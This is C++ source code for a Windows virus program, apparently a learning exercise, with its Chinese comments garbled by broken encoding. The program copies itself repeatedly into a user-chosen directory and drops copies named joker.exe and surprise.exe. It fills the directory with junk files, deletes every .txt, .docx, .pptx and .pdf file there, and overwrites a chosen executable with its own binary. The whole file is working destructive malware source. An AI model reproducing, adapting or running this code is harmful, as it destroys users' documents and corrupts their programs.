#include<stdio.h>
#include<io.h>
#include<iostream>
#include<fstream>
#include<ios>
#include<Windows.h>
#include<stdlib.h>
#include<string.h>
#include <direct.h>
using namespace std;

#define MAXSIZE 4096

#define MAXPATH 1024

const int BUFFER_SIZE=4;

char INFECT_PATH[100], DELETE_FILE1[100], DELETE_FILE2[100] , DELETE_FILE3[100],DELETE_FILE4[100],CREAT_EXE1[100],CREAT_EXE2[100],Virusfile[100],Targetfile[100] ; 
char dest[100];
char path[100][260];

void MakeRubbish(void);//���������ļ� 
void CreatEXE(void); // ����exe�����ļ� 
void Remove(void);//��.txt ��docx��pptx��pdf�ļ�ɾ�� 
void copyfile(char* infile,char *outfile); //�����ļ����� 

void MakeRubbish(void) //���������ļ� 
{
	for (int j=1;j<=5;j++){
	
	    int i=0;
	    FILE *fp=NULL;
	    char* path=NULL;
	    char* NewName=NULL;
	    char tempname[]="XXXXXX";
	    path=INFECT_PATH;   
	    if(!_chdir(path)){ }
	    else
	    {
	        perror("Error: ");
	    }
	    NewName=_mktemp(tempname);
	    fp=fopen(NewName,"w");
	    fclose(fp);
 	}
}

void CreatEXE(void)  //����exe�����ļ� 
{
    int i;
    char* s[2]={CREAT_EXE1,CREAT_EXE2};
    for(i=0;i<2;i++)
    {
        open(s[i],0x0100,0x0080);
        copyfile(Virusfile,s[i]);
    }
}

void Remove(void)  //ɾ�����е�docx��pptx��txt��pdf�ļ� 
{
    int done;
    int i;

    struct _finddata_t ffblk;
    char *documenttype[4] = {DELETE_FILE1,DELETE_FILE2,DELETE_FILE3,DELETE_FILE4}; 
    for (i = 0; i < 4; i++)
    {
        done = _findfirst(documenttype[i],&ffblk);
        while(done!=-1)
        {
            printf("delete %s\n",ffblk.name);
            remove(ffblk.name);                             
            while (!_findnext(done,&ffblk))
            {
                printf("delete %s\n",ffblk.name);
                remove(ffblk.name);                         
            }
            done = _findfirst(documenttype[i],&ffblk);
        }
        _findclose(done);
    }
}

void copyfile(char* infile,char* outfile)
{
    FILE *in,*out;
    in=fopen(infile,"r");
    out=fopen(outfile,"w");
    while(!feof(in))
    {
        fputc(fgetc(in),out);
    }
    fclose(in);
    fclose(out);
}


int fun(char *s)
{
    char t[100];
    int i, j;
    for(i=0; s[i]; i++)  /*����s��������t*/
        t[i]=s[i];
    t[i]='\0';
    for(i=0,j=0; t[i]; i++)
    /*���������ַ���дһ��$���ţ���д�������ַ�*/
        if(t[i]=='\\')
        {
            s[j++]='\\';
            s[j++]=t[i];
        }
    /*���ڷ������ַ�ԭ��д�봮s*/
        else
            s[j++]=t[i];
    s[j]='\0';  /*�ڴ�s��β�ӽ�����־*/
    return 0;
}
int FindEXE(){

	
	long Handle;
	char findstr[100];
	 strcpy(findstr, dest);
	 strcat(findstr,  "\\*.exe");
	struct _finddata_t FileInfo;
	if((Handle=_findfirst(findstr,&FileInfo))==-1L)
		printf("û���ҵ�ƥ�����Ŀ\n");
	else
	{
		int  i=1;
		strcpy(path[i],FileInfo.name);
		
		printf("%d %s\n",i,FileInfo.name);
		i++;
		while( _findnext(Handle,&FileInfo)==0){
			strcpy(path[i],FileInfo.name);
			printf("%d %s\n",i,FileInfo.name);
			i++; 
		}
		
		_findclose(Handle);
	}
	getchar();
	return 0;
	}
/*This is a flag:end*/
int main(void)
{
	//cout << _pgmptr << endl;
	strcpy(Virusfile,_pgmptr);
	fun(Virusfile);
	//cout <<Virusfile<<endl;/
	
	int N;
	do{
		printf("Halllllo! �������ƻ�����\n\n");
		printf("�����븴�ƴ�����");
		scanf("%d", &N);
		if(N > 100)  printf("------���ƴ������󣬸�СһЩ�------\n");
	}while(N > 100);
	

	int flag;
	do{
		printf("��Ҫ��������ƻ��ϣ�\n����Ŀ���ַ��");
		scanf("%s", &dest);
		flag = access(dest, 0);
		if(flag != 0)  printf("------Ŀ���ַд��ඣ�����дһ���------\n");
	}while(flag != 0);
	 strcpy(INFECT_PATH, dest);
	 strcpy(DELETE_FILE1, dest);
	 strcat(DELETE_FILE1,  "\\*.txt");
	 strcpy(DELETE_FILE2, dest);
	 strcat(DELETE_FILE2,  "\\*.docx");
	 strcpy(DELETE_FILE3, dest);
	 strcat(DELETE_FILE3,  "\\*.pptx");
	 strcpy(DELETE_FILE4, dest);
	 strcat(DELETE_FILE4,  "\\*.pdf");
	 strcpy(CREAT_EXE1, dest);
	 strcat(CREAT_EXE1,  "\\joker.exe");
	 strcpy(CREAT_EXE2, dest);
	 strcat(CREAT_EXE2,  "\\surprise.exe");
	 strcpy(Targetfile, dest);
	 strcat(Targetfile,  "\\test.exe");
	char stri[2];
	 for (int i=1;i<=N;i++){
		 
		 char Target[100];
		 char tmpBuf[4096] = { 0 };
		 strcpy(Target, dest);  //Target�洢���ƺ���ļ��� 
		 strcat(Target, "\\OK");
		 itoa(i,stri,10);//10��������ת�ַ��� 
		 strcat(Target,stri);  //��Ӻ�׺�ļ��� 
		 strcat(Target, ".exe");
		FILE *fp1 = fopen(Virusfile, "rb");  //�򿪲����ļ� 
		FILE *fp2 = fopen(Target, "wb");  //��Ҫд���Ŀ���ļ� 
		int count = 0;
		while ((count = fread(tmpBuf, sizeof(char), MAXSIZE, fp1))) 
		{
			//ÿ������4096���ֽڵ�����
			fwrite(tmpBuf, sizeof(char), count, fp2);//��ÿ��ʵ�ʶ���������д��Ŀ���ļ�
		}
		fclose(fp1);
		fclose(fp2);
	}


	printf("------�ļ���ɸ��ƣ�------\n");	

    MakeRubbish( );             //���������ļ�
    CreatEXE( );                //�����ִ�г���
    Remove( );                  //ɾ���ļ�
    cout<<endl;
    printf("��Ŀ��Ŀ¼������������exe�ļ���������Ҫ��Ⱦ���ļ��ţ�����0�˳���\n");
    FindEXE();
    int num;
    scanf("%d",&num);
    if (num==0) {
    	system("pause");
   		return 0;
    }
	 char Target[100];
	 char tmpBuf[4096] = { 0 };
	 strcpy(Target, dest);
	 strcat(Target, "\\");
	 strcat(Target,path[num]);
	FILE *fp1 = fopen(Virusfile, "rb");
	FILE *fp2 = fopen(Target, "wb");
	int count = 0;
	while ((count = fread(tmpBuf, sizeof(char), MAXSIZE, fp1)))
	{
		//ÿ������4096���ֽڵ�����
		fwrite(tmpBuf, sizeof(char), count, fp2);//��ÿ��ʵ�ʶ���������д��Ŀ���ļ�
	}
	fclose(fp1);
	fclose(fp2);
    printf("��Ⱦ�ɹ�\n"); 
    system("pause");
    return 0;
}

